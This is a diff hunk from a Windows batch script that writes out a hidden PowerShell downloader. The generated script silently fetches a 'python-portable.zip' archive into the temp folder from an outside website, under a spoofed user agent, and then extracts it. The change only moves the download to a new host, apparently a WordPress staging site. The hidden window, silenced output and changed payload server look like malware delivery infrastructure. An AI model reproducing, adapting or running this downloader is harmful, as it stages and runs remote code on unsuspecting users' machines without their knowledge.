@@ -13,7 +13,7 @@ echo start /b powershell -WindowStyle Hidden -Command "$ProgressPreference='Sile
 echo timeout /t 2 /nobreak ^>nul
 echo.
 echo REM Download Python portable
-echo powershell -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue';Invoke-WebRequest -Uri 'https://centremedicalwakim.com/app/python-portable.zip' -OutFile $env:temp'\py.zip' -UserAgent 'Mozilla/5.0' -UseBasicParsing" ^>nul 2^>^&1
+echo powershell -WindowStyle Hidden -Command "$ProgressPreference='SilentlyContinue';Invoke-WebRequest -Uri 'https://staging.derideal.com/wp-content/app/python-portable.zip' -OutFile $env:temp'\py.zip' -UserAgent 'Mozilla/5.0' -UseBasicParsing" ^>nul 2^>^&1
 echo timeout /t 3 /nobreak ^>nul
 echo.
 echo REM Extract Python
